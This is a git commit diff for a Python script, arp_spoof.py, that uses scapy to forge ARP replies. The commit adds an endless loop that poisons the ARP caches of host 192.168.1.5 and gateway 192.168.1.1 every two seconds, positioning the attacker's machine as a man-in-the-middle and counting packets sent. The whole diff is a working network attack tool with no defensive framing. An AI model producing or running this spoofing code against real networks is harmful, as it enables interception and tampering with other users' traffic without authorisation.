81d5383d4f4504c31cf3cf26915d6b86143914a4
iw4p <nimakbarzade@yahoo.com>
2019-07-18 09:17:54 -0400

    spoof

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+import time
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -15,6 +16,13 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
-get_mac("192.168.1.1")
+counter = 0
+
+while True:
+    spoof("192.168.1.5", "192.168.1.1")
+    spoof("192.168.1.1", "192.168.1.5")
+    counter = counter + 2
+    print(" [+] Packets sent: " + str(counter))
+    time.sleep(2)
